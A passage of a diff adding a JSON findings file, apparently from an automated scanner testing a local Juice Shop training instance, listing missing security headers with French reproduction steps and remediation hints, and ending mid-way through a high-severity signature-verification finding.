+      "http://localhost:3000/ftp/quarantine/juicy_malware_linux_arm_64.url"
+    ],
+    "proof": {
+      "observations": [
+        "OBS-fded2e3f"
+      ],
+      "experiments": [],
+      "diffs": [],
+      "reproduction_steps": [
+        "1. Envoyer GET http://localhost:3000/ftp/quarantine/juicy_malware_linux_arm_64.url",
+        "2. Observer la réponse : Referrer-Policy absent"
+      ],
+      "passive_tags": [
+        "missing:RP"
+      ]
+    },
+    "remediation_hint": "Ajouter le header RP dans toutes les réponses HTTP.",
+    "confirmed_threshold_used": 0.85
+  },
+  {
+    "id": "FIND-f85df55b",
+    "hypothesis_id": "passive-observation",
+    "property_id": "",
+    "status": "CONFIRMED",
+    "confidence": 0.96,
+    "confidence_breakdown": {
+      "oracle_strength": 1.0,
+      "reproducibility": 0.65,
+      "observation_quality": 0.8,
+      "behavioral_specificity": 1.0,
+      "experiment_coverage": 0.5,
+      "overall": 0.77,
+      "v2_boost": 0.0,
+      "ml_boost": 0.0
+    },
+    "explanation": null,
+    "owasp_category": "A05:2021",
+    "cwe_id": "CWE-346",
+    "severity": "LOW",
+    "affected_endpoints": [
+      "http://localhost:3000/ftp/quarantine/juicy_malware_linux_arm_64.url"
+    ],
+    "proof": {
+      "observations": [
+        "OBS-fded2e3f"
+      ],
+      "experiments": [],
+      "diffs": [],
+      "reproduction_steps": [
+        "1. Envoyer GET http://localhost:3000/ftp/quarantine/juicy_malware_linux_arm_64.url",
+        "2. Observer la réponse : Cross-Origin-Opener-Policy absent"
+      ],
+      "passive_tags": [
+        "missing:COOP"
+      ]
+    },
+    "remediation_hint": "Ajouter le header COOP dans toutes les réponses HTTP.",
+    "confirmed_threshold_used": 0.85
+  },
+  {
+    "id": "FIND-d692e3ab",
+    "hypothesis_id": "passive-observation",
+    "property_id": "",
+    "status": "CONFIRMED",
+    "confidence": 0.96,
+    "confidence_breakdown": {
+      "oracle_strength": 1.0,
+      "reproducibility": 0.65,
+      "observation_quality": 0.8,
+      "behavioral_specificity": 1.0,
+      "experiment_coverage": 0.5,
+      "overall": 0.77,
+      "v2_boost": 0.0,
+      "ml_boost": 0.0
+    },
+    "explanation": null,
+    "owasp_category": "A05:2021",
+    "cwe_id": "CWE-693",
+    "severity": "MEDIUM",
+    "affected_endpoints": [
+      "http://localhost:3000/ftp/quarantine/juicy_malware_macos_64.url"
+    ],
+    "proof": {
+      "observations": [
+        "OBS-1c915bd5"
+      ],
+      "experiments": [],
+      "diffs": [],
+      "reproduction_steps": [
+        "1. Envoyer GET http://localhost:3000/ftp/quarantine/juicy_malware_macos_64.url",
+        "2. Observer la réponse : Content-Security-Policy absent"
+      ],
+      "passive_tags": [
+        "missing:CSP"
+      ]
+    },
+    "remediation_hint": "Ajouter le header CSP dans toutes les réponses HTTP.",
+    "confirmed_threshold_used": 0.85
+  },
+  {
+    "id": "FIND-cb7f7d5f",
+    "hypothesis_id": "passive-observation",
+    "property_id": "",
+    "status": "CONFIRMED",
+    "confidence": 0.96,
+    "confidence_breakdown": {
+      "oracle_strength": 1.0,
+      "reproducibility": 0.65,
+      "observation_quality": 0.8,
+      "behavioral_specificity": 1.0,
+      "experiment_coverage": 0.5,
+      "overall": 0.77,
+      "v2_boost": 0.0,
+      "ml_boost": 0.0
+    },
+    "explanation": null,
+    "owasp_category": "A05:2021",
+    "cwe_id": "CWE-116",
+    "severity": "INFO",
+    "affected_endpoints": [
+      "http://localhost:3000/ftp/quarantine/juicy_malware_macos_64.url"
+    ],
+    "proof": {
+      "observations": [
+        "OBS-1c915bd5"
+      ],
+      "experiments": [],
+      "diffs": [],
+      "reproduction_steps": [
+        "1. Envoyer GET http://localhost:3000/ftp/quarantine/juicy_malware_macos_64.url",
+        "2. Observer la réponse : Referrer-Policy absent"
+      ],
+      "passive_tags": [
+        "missing:RP"
+      ]
+    },
+    "remediation_hint": "Ajouter le header RP dans toutes les réponses HTTP.",
+    "confirmed_threshold_used": 0.85
+  },
+  {
+    "id": "FIND-3a810684",
+    "hypothesis_id": "passive-observation",
+    "property_id": "",
+    "status": "CONFIRMED",
+    "confidence": 0.96,
+    "confidence_breakdown": {
+      "oracle_strength": 1.0,
+      "reproducibility": 0.65,
+      "observation_quality": 0.8,
+      "behavioral_specificity": 1.0,
+      "experiment_coverage": 0.5,
+      "overall": 0.77,
+      "v2_boost": 0.0,
+      "ml_boost": 0.0
+    },
+    "explanation": null,
+    "owasp_category": "A05:2021",
+    "cwe_id": "CWE-346",
+    "severity": "LOW",
+    "affected_endpoints": [
+      "http://localhost:3000/ftp/quarantine/juicy_malware_macos_64.url"
+    ],
+    "proof": {
+      "observations": [
+        "OBS-1c915bd5"
+      ],
+      "experiments": [],
+      "diffs": [],
+      "reproduction_steps": [
+        "1. Envoyer GET http://localhost:3000/ftp/quarantine/juicy_malware_macos_64.url",
+        "2. Observer la réponse : Cross-Origin-Opener-Policy absent"
+      ],
+      "passive_tags": [
+        "missing:COOP"
+      ]
+    },
+    "remediation_hint": "Ajouter le header COOP dans toutes les réponses HTTP.",
+    "confirmed_threshold_used": 0.85
+  },
+  {
+    "id": "FIND-f0a334b2",
+    "hypothesis_id": "passive-observation",
+    "property_id": "",
+    "status": "CONFIRMED",
+    "confidence": 0.96,
+    "confidence_breakdown": {
+      "oracle_strength": 1.0,
+      "reproducibility": 0.65,
+      "observation_quality": 0.8,
+      "behavioral_specificity": 1.0,
+      "experiment_coverage": 0.5,
+      "overall": 0.77,
+      "v2_boost": 0.0,
+      "ml_boost": 0.0
+    },
+    "explanation": null,
+    "owasp_category": "A05:2021",
+    "cwe_id": "CWE-693",
+    "severity": "MEDIUM",
+    "affected_endpoints": [
+      "http://localhost:3000/ftp/quarantine/juicy_malware_windows_64.exe.url"
+    ],
+    "proof": {
+      "observations": [
+        "OBS-b8cd9082"
+      ],
+      "experiments": [],
+      "diffs": [],
+      "reproduction_steps": [
+        "1. Envoyer GET http://localhost:3000/ftp/quarantine/juicy_malware_windows_64.exe.url",
+        "2. Observer la réponse : Content-Security-Policy absent"
+      ],
+      "passive_tags": [
+        "missing:CSP"
+      ]
+    },
+    "remediation_hint": "Ajouter le header CSP dans toutes les réponses HTTP.",
+    "confirmed_threshold_used": 0.85
+  },
+  {
+    "id": "FIND-d712d218",
+    "hypothesis_id": "passive-observation",
+    "property_id": "",
+    "status": "CONFIRMED",
+    "confidence": 0.96,
+    "confidence_breakdown": {
+      "oracle_strength": 1.0,
+      "reproducibility": 0.65,
+      "observation_quality": 0.8,
+      "behavioral_specificity": 1.0,
+      "experiment_coverage": 0.5,
+      "overall": 0.77,
+      "v2_boost": 0.0,
+      "ml_boost": 0.0
+    },
+    "explanation": null,
+    "owasp_category": "A05:2021",
+    "cwe_id": "CWE-116",
+    "severity": "INFO",
+    "affected_endpoints": [
+      "http://localhost:3000/ftp/quarantine/juicy_malware_windows_64.exe.url"
+    ],
+    "proof": {
+      "observations": [
+        "OBS-b8cd9082"
+      ],
+      "experiments": [],
+      "diffs": [],
+      "reproduction_steps": [
+        "1. Envoyer GET http://localhost:3000/ftp/quarantine/juicy_malware_windows_64.exe.url",
+        "2. Observer la réponse : Referrer-Policy absent"
+      ],
+      "passive_tags": [
+        "missing:RP"
+      ]
+    },
+    "remediation_hint": "Ajouter le header RP dans toutes les réponses HTTP.",
+    "confirmed_threshold_used": 0.85
+  },
+  {
+    "id": "FIND-3c98b33a",
+    "hypothesis_id": "passive-observation",
+    "property_id": "",
+    "status": "CONFIRMED",
+    "confidence": 0.96,
+    "confidence_breakdown": {
+      "oracle_strength": 1.0,
+      "reproducibility": 0.65,
+      "observation_quality": 0.8,
+      "behavioral_specificity": 1.0,
+      "experiment_coverage": 0.5,
+      "overall": 0.77,
+      "v2_boost": 0.0,
+      "ml_boost": 0.0
+    },
+    "explanation": null,
+    "owasp_category": "A05:2021",
+    "cwe_id": "CWE-346",
+    "severity": "LOW",
+    "affected_endpoints": [
+      "http://localhost:3000/ftp/quarantine/juicy_malware_windows_64.exe.url"
+    ],
+    "proof": {
+      "observations": [
+        "OBS-b8cd9082"
+      ],
+      "experiments": [],
+      "diffs": [],
+      "reproduction_steps": [
+        "1. Envoyer GET http://localhost:3000/ftp/quarantine/juicy_malware_windows_64.exe.url",
+        "2. Observer la réponse : Cross-Origin-Opener-Policy absent"
+      ],
+      "passive_tags": [
+        "missing:COOP"
+      ]
+    },
+    "remediation_hint": "Ajouter le header COOP dans toutes les réponses HTTP.",
+    "confirmed_threshold_used": 0.85
+  },
+  {
+    "id": "FIND-2b4d3cca",
+    "hypothesis_id": "passive-observation",
+    "property_id": "",
+    "status": "CONFIRMED",
+    "confidence": 0.96,
+    "confidence_breakdown": {
+      "oracle_strength": 1.0,
+      "reproducibility": 0.65,
+      "observation_quality": 0.8,
+      "behavioral_specificity": 1.0,
+      "experiment_coverage": 0.5,
+      "overall": 0.77,
+      "v2_boost": 0.0,
+      "ml_boost": 0.0
+    },
+    "explanation": null,
+    "owasp_category": "A05:2021",
+    "cwe_id": "CWE-693",
+    "severity": "MEDIUM",
+    "affected_endpoints": [
+      "http://localhost:3000/api/BasketItems"
+    ],
+    "proof": {
+      "observations": [
+        "OBS-1c7eb669"
+      ],
+      "experiments": [],
+      "diffs": [],
+      "reproduction_steps": [
+        "1. Envoyer GET http://localhost:3000/api/BasketItems",
+        "2. Observer la réponse : Content-Security-Policy absent"
+      ],
+      "passive_tags": [
+        "missing:CSP"
+      ]
+    },
+    "remediation_hint": "Ajouter le header CSP dans toutes les réponses HTTP.",
+    "confirmed_threshold_used": 0.85
+  },
+  {
+    "id": "FIND-15feed78",
+    "hypothesis_id": "passive-observation",
+    "property_id": "",
+    "status": "CONFIRMED",
+    "confidence": 0.96,
+    "confidence_breakdown": {
+      "oracle_strength": 1.0,
+      "reproducibility": 0.65,
+      "observation_quality": 0.8,
+      "behavioral_specificity": 1.0,
+      "experiment_coverage": 0.5,
+      "overall": 0.77,
+      "v2_boost": 0.0,
+      "ml_boost": 0.0
+    },
+    "explanation": null,
+    "owasp_category": "A05:2021",
+    "cwe_id": "CWE-116",
+    "severity": "INFO",
+    "affected_endpoints": [
+      "http://localhost:3000/api/BasketItems"
+    ],
+    "proof": {
+      "observations": [
+        "OBS-1c7eb669"
+      ],
+      "experiments": [],
+      "diffs": [],
+      "reproduction_steps": [
+        "1. Envoyer GET http://localhost:3000/api/BasketItems",
+        "2. Observer la réponse : Referrer-Policy absent"
+      ],
+      "passive_tags": [
+        "missing:RP"
+      ]
+    },
+    "remediation_hint": "Ajouter le header RP dans toutes les réponses HTTP.",
+    "confirmed_threshold_used": 0.85
+  },
+  {
+    "id": "FIND-841f1d65",
+    "hypothesis_id": "passive-observation",
+    "property_id": "",
+    "status": "CONFIRMED",
+    "confidence": 0.96,
+    "confidence_breakdown": {
+      "oracle_strength": 1.0,
+      "reproducibility": 0.65,
+      "observation_quality": 0.8,
+      "behavioral_specificity": 1.0,
+      "experiment_coverage": 0.5,
+      "overall": 0.77,
+      "v2_boost": 0.0,
+      "ml_boost": 0.0
+    },
+    "explanation": null,
+    "owasp_category": "A05:2021",
+    "cwe_id": "CWE-346",
+    "severity": "LOW",
+    "affected_endpoints": [
+      "http://localhost:3000/api/BasketItems"
+    ],
+    "proof": {
+      "observations": [
+        "OBS-1c7eb669"
+      ],
+      "experiments": [],
+      "diffs": [],
+      "reproduction_steps": [
+        "1. Envoyer GET http://localhost:3000/api/BasketItems",
+        "2. Observer la réponse : Cross-Origin-Opener-Policy absent"
+      ],
+      "passive_tags": [
+        "missing:COOP"
+      ]
+    },
+    "remediation_hint": "Ajouter le header COOP dans toutes les réponses HTTP.",
+    "confirmed_threshold_used": 0.85
+  },
+  {
+    "id": "FIND-7f6a1ed6",
+    "hypothesis_id": "passive-observation",
+    "property_id": "",
+    "status": "CONFIRMED",
+    "confidence": 0.96,
+    "confidence_breakdown": {
+      "oracle_strength": 1.0,
+      "reproducibility": 0.65,
+      "observation_quality": 0.8,
+      "behavioral_specificity": 1.0,
+      "experiment_coverage": 0.5,
+      "overall": 0.77,
+      "v2_boost": 0.0,
+      "ml_boost": 0.0
+    },
+    "explanation": null,
+    "owasp_category": "A05:2021",
+    "cwe_id": "CWE-693",
+    "severity": "MEDIUM",
+    "affected_endpoints": [
+      "http://localhost:3000/api/Complaints"
+    ],
+    "proof": {
+      "observations": [
+        "OBS-9c944985"
+      ],
+      "experiments": [],
+      "diffs": [],
+      "reproduction_steps": [
+        "1. Envoyer GET http://localhost:3000/api/Complaints",
+        "2. Observer la réponse : Content-Security-Policy absent"
+      ],
+      "passive_tags": [
+        "missing:CSP"
+      ]
+    },
+    "remediation_hint": "Ajouter le header CSP dans toutes les réponses HTTP.",
+    "confirmed_threshold_used": 0.85
+  },
+  {
+    "id": "FIND-80dbc000",
+    "hypothesis_id": "passive-observation",
+    "property_id": "",
+    "status": "CONFIRMED",
+    "confidence": 0.96,
+    "confidence_breakdown": {
+      "oracle_strength": 1.0,
+      "reproducibility": 0.65,
+      "observation_quality": 0.8,
+      "behavioral_specificity": 1.0,
+      "experiment_coverage": 0.5,
+      "overall": 0.77,
+      "v2_boost": 0.0,
+      "ml_boost": 0.0
+    },
+    "explanation": null,
+    "owasp_category": "A05:2021",
+    "cwe_id": "CWE-116",
+    "severity": "INFO",
+    "affected_endpoints": [
+      "http://localhost:3000/api/Complaints"
+    ],
+    "proof": {
+      "observations": [
+        "OBS-9c944985"
+      ],
+      "experiments": [],
+      "diffs": [],
+      "reproduction_steps": [
+        "1. Envoyer GET http://localhost:3000/api/Complaints",
+        "2. Observer la réponse : Referrer-Policy absent"
+      ],
+      "passive_tags": [
+        "missing:RP"
+      ]
+    },
+    "remediation_hint": "Ajouter le header RP dans toutes les réponses HTTP.",
+    "confirmed_threshold_used": 0.85
+  },
+  {
+    "id": "FIND-14f4347b",
+    "hypothesis_id": "passive-observation",
+    "property_id": "",
+    "status": "CONFIRMED",
+    "confidence": 0.96,
+    "confidence_breakdown": {
+      "oracle_strength": 1.0,
+      "reproducibility": 0.65,
+      "observation_quality": 0.8,
+      "behavioral_specificity": 1.0,
+      "experiment_coverage": 0.5,
+      "overall": 0.77,
+      "v2_boost": 0.0,
+      "ml_boost": 0.0
+    },
+    "explanation": null,
+    "owasp_category": "A05:2021",
+    "cwe_id": "CWE-346",
+    "severity": "LOW",
+    "affected_endpoints": [
+      "http://localhost:3000/api/Complaints"
+    ],
+    "proof": {
+      "observations": [
+        "OBS-9c944985"
+      ],
+      "experiments": [],
+      "diffs": [],
+      "reproduction_steps": [
+        "1. Envoyer GET http://localhost:3000/api/Complaints",
+        "2. Observer la réponse : Cross-Origin-Opener-Policy absent"
+      ],
+      "passive_tags": [
+        "missing:COOP"
+      ]
+    },
+    "remediation_hint": "Ajouter le header COOP dans toutes les réponses HTTP.",
+    "confirmed_threshold_used": 0.85
+  },
+  {
+    "id": "FIND-997e4fdc",
+    "hypothesis_id": "passive-observation",
+    "property_id": "",
+    "status": "CONFIRMED",
+    "confidence": 0.96,
+    "confidence_breakdown": {
+      "oracle_strength": 1.0,
+      "reproducibility": 0.65,
+      "observation_quality": 0.8,
+      "behavioral_specificity": 1.0,
+      "experiment_coverage": 0.5,
+      "overall": 0.77,
+      "v2_boost": 0.0,
+      "ml_boost": 0.0
+    },
+    "explanation": null,
+    "owasp_category": "A05:2021",
+    "cwe_id": "CWE-693",
+    "severity": "MEDIUM",
+    "affected_endpoints": [
+      "http://localhost:3000/rest/image-captcha/"
+    ],
+    "proof": {
+      "observations": [
+        "OBS-9273b85a"
+      ],
+      "experiments": [],
+      "diffs": [],
+      "reproduction_steps": [
+        "1. Envoyer GET http://localhost:3000/rest/image-captcha/",
+        "2. Observer la réponse : Content-Security-Policy absent"
+      ],
+      "passive_tags": [
+        "missing:CSP"
+      ]
+    },
+    "remediation_hint": "Ajouter le header CSP dans toutes les réponses HTTP.",
+    "confirmed_threshold_used": 0.85
+  },
+  {
+    "id": "FIND-1f32f174",
+    "hypothesis_id": "passive-observation",
+    "property_id": "",
+    "status": "CONFIRMED",
+    "confidence": 0.96,
+    "confidence_breakdown": {
+      "oracle_strength": 1.0,
+      "reproducibility": 0.65,
+      "observation_quality": 0.8,
+      "behavioral_specificity": 1.0,
+      "experiment_coverage": 0.5,
+      "overall": 0.77,
+      "v2_boost": 0.0,
+      "ml_boost": 0.0
+    },
+    "explanation": null,
+    "owasp_category": "A05:2021",
+    "cwe_id": "CWE-116",
+    "severity": "INFO",
+    "affected_endpoints": [
+      "http://localhost:3000/rest/image-captcha/"
+    ],
+    "proof": {
+      "observations": [
+        "OBS-9273b85a"
+      ],
+      "experiments": [],
+      "diffs": [],
+      "reproduction_steps": [
+        "1. Envoyer GET http://localhost:3000/rest/image-captcha/",
+        "2. Observer la réponse : Referrer-Policy absent"
+      ],
+      "passive_tags": [
+        "missing:RP"
+      ]
+    },
+    "remediation_hint": "Ajouter le header RP dans toutes les réponses HTTP.",
+    "confirmed_threshold_used": 0.85
+  },
+  {
+    "id": "FIND-ce1c5c71",
+    "hypothesis_id": "passive-observation",
+    "property_id": "",
+    "status": "CONFIRMED",
+    "confidence": 0.96,
+    "confidence_breakdown": {
+      "oracle_strength": 1.0,
+      "reproducibility": 0.65,
+      "observation_quality": 0.8,
+      "behavioral_specificity": 1.0,
+      "experiment_coverage": 0.5,
+      "overall": 0.77,
+      "v2_boost": 0.0,
+      "ml_boost": 0.0
+    },
+    "explanation": null,
+    "owasp_category": "A05:2021",
+    "cwe_id": "CWE-346",
+    "severity": "LOW",
+    "affected_endpoints": [
+      "http://localhost:3000/rest/image-captcha/"
+    ],
+    "proof": {
+      "observations": [
+        "OBS-9273b85a"
+      ],
+      "experiments": [],
+      "diffs": [],
+      "reproduction_steps": [
+        "1. Envoyer GET http://localhost:3000/rest/image-captcha/",
+        "2. Observer la réponse : Cross-Origin-Opener-Policy absent"
+      ],
+      "passive_tags": [
+        "missing:COOP"
+      ]
+    },
+    "remediation_hint": "Ajouter le header COOP dans toutes les réponses HTTP.",
+    "confirmed_threshold_used": 0.85
+  },
+  {
+    "id": "FIND-3f376c08",
+    "hypothesis_id": "passive-observation",
+    "property_id": "",
+    "status": "CONFIRMED",
+    "confidence": 0.96,
+    "confidence_breakdown": {
+      "oracle_strength": 1.0,
+      "reproducibility": 0.65,
+      "observation_quality": 0.8,
+      "behavioral_specificity": 1.0,
+      "experiment_coverage": 0.5,
+      "overall": 0.77,
+      "v2_boost": 0.0,
+      "ml_boost": 0.0
+    },
+    "explanation": null,
+    "owasp_category": "A05:2021",
+    "cwe_id": "CWE-693",
+    "severity": "MEDIUM",
+    "affected_endpoints": [
+      "http://localhost:3000/rest/wallet/balance"
+    ],
+    "proof": {
+      "observations": [
+        "OBS-f54b9d71"
+      ],
+      "experiments": [],
+      "diffs": [],
+      "reproduction_steps": [
+        "1. Envoyer GET http://localhost:3000/rest/wallet/balance",
+        "2. Observer la réponse : Content-Security-Policy absent"
+      ],
+      "passive_tags": [
+        "missing:CSP"
+      ]
+    },
+    "remediation_hint": "Ajouter le header CSP dans toutes les réponses HTTP.",
+    "confirmed_threshold_used": 0.85
+  },
+  {
+    "id": "FIND-388a7db5",
+    "hypothesis_id": "passive-observation",
+    "property_id": "",
+    "status": "CONFIRMED",
+    "confidence": 0.96,
+    "confidence_breakdown": {
+      "oracle_strength": 1.0,
+      "reproducibility": 0.65,
+      "observation_quality": 0.8,
+      "behavioral_specificity": 1.0,
+      "experiment_coverage": 0.5,
+      "overall": 0.77,
+      "v2_boost": 0.0,
+      "ml_boost": 0.0
+    },
+    "explanation": null,
+    "owasp_category": "A05:2021",
+    "cwe_id": "CWE-116",
+    "severity": "INFO",
+    "affected_endpoints": [
+      "http://localhost:3000/rest/wallet/balance"
+    ],
+    "proof": {
+      "observations": [
+        "OBS-f54b9d71"
+      ],
+      "experiments": [],
+      "diffs": [],
+      "reproduction_steps": [
+        "1. Envoyer GET http://localhost:3000/rest/wallet/balance",
+        "2. Observer la réponse : Referrer-Policy absent"
+      ],
+      "passive_tags": [
+        "missing:RP"
+      ]
+    },
+    "remediation_hint": "Ajouter le header RP dans toutes les réponses HTTP.",
+    "confirmed_threshold_used": 0.85
+  },
+  {
+    "id": "FIND-a77f5b54",
+    "hypothesis_id": "passive-observation",
+    "property_id": "",
+    "status": "CONFIRMED",
+    "confidence": 0.96,
+    "confidence_breakdown": {
+      "oracle_strength": 1.0,
+      "reproducibility": 0.65,
+      "observation_quality": 0.8,
+      "behavioral_specificity": 1.0,
+      "experiment_coverage": 0.5,
+      "overall": 0.77,
+      "v2_boost": 0.0,
+      "ml_boost": 0.0
+    },
+    "explanation": null,
+    "owasp_category": "A05:2021",
+    "cwe_id": "CWE-346",
+    "severity": "LOW",
+    "affected_endpoints": [
+      "http://localhost:3000/rest/wallet/balance"
+    ],
+    "proof": {
+      "observations": [
+        "OBS-f54b9d71"
+      ],
+      "experiments": [],
+      "diffs": [],
+      "reproduction_steps": [
+        "1. Envoyer GET http://localhost:3000/rest/wallet/balance",
+        "2. Observer la réponse : Cross-Origin-Opener-Policy absent"
+      ],
+      "passive_tags": [
+        "missing:COOP"
+      ]
+    },
+    "remediation_hint": "Ajouter le header COOP dans toutes les réponses HTTP.",
+    "confirmed_threshold_used": 0.85
+  },
+  {
+    "id": "FIND-d853961b",
+    "hypothesis_id": "passive-observation",
+    "property_id": "",
+    "status": "CONFIRMED",
+    "confidence": 0.96,
+    "confidence_breakdown": {
+      "oracle_strength": 1.0,
+      "reproducibility": 0.65,
+      "observation_quality": 0.8,
+      "behavioral_specificity": 1.0,
+      "experiment_coverage": 0.5,
+      "overall": 0.77,
+      "v2_boost": 0.0,
+      "ml_boost": 0.0
+    },
+    "explanation": null,
+    "owasp_category": "A05:2021",
+    "cwe_id": "CWE-693",
+    "severity": "MEDIUM",
+    "affected_endpoints": [
+      "http://localhost:3000/api/Cards"
+    ],
+    "proof": {
+      "observations": [
+        "OBS-22aac3fc"
+      ],
+      "experiments": [],
+      "diffs": [],
+      "reproduction_steps": [
+        "1. Envoyer GET http://localhost:3000/api/Cards",
+        "2. Observer la réponse : Content-Security-Policy absent"
+      ],
+      "passive_tags": [
+        "missing:CSP"
+      ]
+    },
+    "remediation_hint": "Ajouter le header CSP dans toutes les réponses HTTP.",
+    "confirmed_threshold_used": 0.85
+  },
+  {
+    "id": "FIND-eb18c9ee",
+    "hypothesis_id": "passive-observation",
+    "property_id": "",
+    "status": "CONFIRMED",
+    "confidence": 0.96,
+    "confidence_breakdown": {
+      "oracle_strength": 1.0,
+      "reproducibility": 0.65,
+      "observation_quality": 0.8,
+      "behavioral_specificity": 1.0,
+      "experiment_coverage": 0.5,
+      "overall": 0.77,
+      "v2_boost": 0.0,
+      "ml_boost": 0.0
+    },
+    "explanation": null,
+    "owasp_category": "A05:2021",
+    "cwe_id": "CWE-116",
+    "severity": "INFO",
+    "affected_endpoints": [
+      "http://localhost:3000/api/Cards"
+    ],
+    "proof": {
+      "observations": [
+        "OBS-22aac3fc"
+      ],
+      "experiments": [],
+      "diffs": [],
+      "reproduction_steps": [
+        "1. Envoyer GET http://localhost:3000/api/Cards",
+        "2. Observer la réponse : Referrer-Policy absent"
+      ],
+      "passive_tags": [
+        "missing:RP"
+      ]
+    },
+    "remediation_hint": "Ajouter le header RP dans toutes les réponses HTTP.",
+    "confirmed_threshold_used": 0.85
+  },
+  {
+    "id": "FIND-73685c14",
+    "hypothesis_id": "passive-observation",
+    "property_id": "",
+    "status": "CONFIRMED",
+    "confidence": 0.96,
+    "confidence_breakdown": {
+      "oracle_strength": 1.0,
+      "reproducibility": 0.65,
+      "observation_quality": 0.8,
+      "behavioral_specificity": 1.0,
+      "experiment_coverage": 0.5,
+      "overall": 0.77,
+      "v2_boost": 0.0,
+      "ml_boost": 0.0
+    },
+    "explanation": null,
+    "owasp_category": "A05:2021",
+    "cwe_id": "CWE-346",
+    "severity": "LOW",
+    "affected_endpoints": [
+      "http://localhost:3000/api/Cards"
+    ],
+    "proof": {
+      "observations": [
+        "OBS-22aac3fc"
+      ],
+      "experiments": [],
+      "diffs": [],
+      "reproduction_steps": [
+        "1. Envoyer GET http://localhost:3000/api/Cards",
+        "2. Observer la réponse : Cross-Origin-Opener-Policy absent"
+      ],
+      "passive_tags": [
+        "missing:COOP"
+      ]
+    },
+    "remediation_hint": "Ajouter le header COOP dans toutes les réponses HTTP.",
+    "confirmed_threshold_used": 0.85
+  },
+  {
+    "id": "FIND-50277e03",
+    "hypothesis_id": "passive-observation",
+    "property_id": "",
+    "status": "CONFIRMED",
+    "confidence": 0.96,
+    "confidence_breakdown": {
+      "oracle_strength": 1.0,
+      "reproducibility": 0.65,
+      "observation_quality": 0.8,
+      "behavioral_specificity": 1.0,
+      "experiment_coverage": 0.5,
+      "overall": 0.77,
+      "v2_boost": 0.0,
+      "ml_boost": 0.0
+    },
+    "explanation": null,
+    "owasp_category": "A05:2021",
+    "cwe_id": "CWE-693",
+    "severity": "MEDIUM",
+    "affected_endpoints": [
+      "http://localhost:3000/rest/order-history"
+    ],
+    "proof": {
+      "observations": [
+        "OBS-4d89161c"
+      ],
+      "experiments": [],
+      "diffs": [],
+      "reproduction_steps": [
+        "1. Envoyer GET http://localhost:3000/rest/order-history",
+        "2. Observer la réponse : Content-Security-Policy absent"
+      ],
+      "passive_tags": [
+        "missing:CSP"
+      ]
+    },
+    "remediation_hint": "Ajouter le header CSP dans toutes les réponses HTTP.",
+    "confirmed_threshold_used": 0.85
+  },
+  {
+    "id": "FIND-bd4fde01",
+    "hypothesis_id": "passive-observation",
+    "property_id": "",
+    "status": "CONFIRMED",
+    "confidence": 0.96,
+    "confidence_breakdown": {
+      "oracle_strength": 1.0,
+      "reproducibility": 0.65,
+      "observation_quality": 0.8,
+      "behavioral_specificity": 1.0,
+      "experiment_coverage": 0.5,
+      "overall": 0.77,
+      "v2_boost": 0.0,
+      "ml_boost": 0.0
+    },
+    "explanation": null,
+    "owasp_category": "A05:2021",
+    "cwe_id": "CWE-116",
+    "severity": "INFO",
+    "affected_endpoints": [
+      "http://localhost:3000/rest/order-history"
+    ],
+    "proof": {
+      "observations": [
+        "OBS-4d89161c"
+      ],
+      "experiments": [],
+      "diffs": [],
+      "reproduction_steps": [
+        "1. Envoyer GET http://localhost:3000/rest/order-history",
+        "2. Observer la réponse : Referrer-Policy absent"
+      ],
+      "passive_tags": [
+        "missing:RP"
+      ]
+    },
+    "remediation_hint": "Ajouter le header RP dans toutes les réponses HTTP.",
+    "confirmed_threshold_used": 0.85
+  },
+  {
+    "id": "FIND-53017441",
+    "hypothesis_id": "passive-observation",
+    "property_id": "",
+    "status": "CONFIRMED",
+    "confidence": 0.96,
+    "confidence_breakdown": {
+      "oracle_strength": 1.0,
+      "reproducibility": 0.65,
+      "observation_quality": 0.8,
+      "behavioral_specificity": 1.0,
+      "experiment_coverage": 0.5,
+      "overall": 0.77,
+      "v2_boost": 0.0,
+      "ml_boost": 0.0
+    },
+    "explanation": null,
+    "owasp_category": "A05:2021",
+    "cwe_id": "CWE-346",
+    "severity": "LOW",
+    "affected_endpoints": [
+      "http://localhost:3000/rest/order-history"
+    ],
+    "proof": {
+      "observations": [
+        "OBS-4d89161c"
+      ],
+      "experiments": [],
+      "diffs": [],
+      "reproduction_steps": [
+        "1. Envoyer GET http://localhost:3000/rest/order-history",
+        "2. Observer la réponse : Cross-Origin-Opener-Policy absent"
+      ],
+      "passive_tags": [
+        "missing:COOP"
+      ]
+    },
+    "remediation_hint": "Ajouter le header COOP dans toutes les réponses HTTP.",
+    "confirmed_threshold_used": 0.85
+  },
+  {
+    "id": "FIND-fcf39238",
+    "hypothesis_id": "HYP-f539dccc",
+    "property_id": "",
+    "status": "CONFIRMED",
+    "confidence": 0.9461,
+    "confidence_breakdown": {
+      "oracle_strength": 0.95,
+      "reproducibility": 1.0,
+      "observation_quality": 0.7737,
+      "behavioral_specificity": 0.95,
+      "experiment_coverage": 1.0,
+      "overall": 0.9461,
+      "v2_boost": 0.0,
+      "ml_boost": 0.0
+    },
+    "explanation": {
+      "v1_score": 0.9461,
+      "v2_score": 0.459,
+      "ml_score": 0.0,
+      "signals": {
+        "oracle_strength": 0.95,
+        "reproducibility": 1.0,
+        "observation_quality": 0.7737,
+        "behavioral_specificity": 0.95,
+        "experiment_coverage": 1.0,
+        "temporal_signal": 0.0,
+        "crossrole_signal": 0.0,
+        "invariant_violated": 0.0,
+        "waf_bypass_success": 0.0,
+        "causal_depth": 0.3333333333333333
+      },
+      "top_contributors": [
+        {
+          "dimension": "reproducibility",
+          "raw_value": 1.0,
+          "weight": 1.5974,
+          "contribution": 1.5974,
+          "label": "Reproductibilité"
+        },
+        {
+          "dimension": "oracle_strength",
+          "raw_value": 0.95,
+          "weight": 1.3286,
+          "contribution": 1.2622,
+          "label": "Force du verdict oracle"
+        },
+        {
+          "dimension": "behavioral_specificity",
+          "raw_value": 0.95,
+          "weight": 0.9307,
+          "contribution": 0.8842,
+          "label": "Spécificité comportementale"
+        },
+        {
+          "dimension": "causal_depth",
+          "raw_value": 0.3333,
+          "weight": 0.9985,
+          "contribution": 0.3328,
+          "label": "Profondeur de causalité (replays)"
+        },
+        {
+          "dimension": "observation_quality",
+          "raw_value": 0.7737,
+          "weight": 0.3351,
+          "contribution": 0.2593,
+          "label": "Qualité des observations"
+        }
+      ],
+      "verdict_rationale": "Principaux signaux : Reproductibilité (+1.60), Force du verdict oracle (+1.26), Spécificité comportementale (+0.88)"
+    },
+    "owasp_category": "A02:2021",
+    "cwe_id": "CWE-347",
+    "severity": "HIGH",
+    "affected_endpoints": [
+      ""
+    ],
+    "proof": {
+      "experiments": [
+        "EXP-4a7bd886",
+        "EXP-4d948905",
+        "EXP-83c9e2a2"
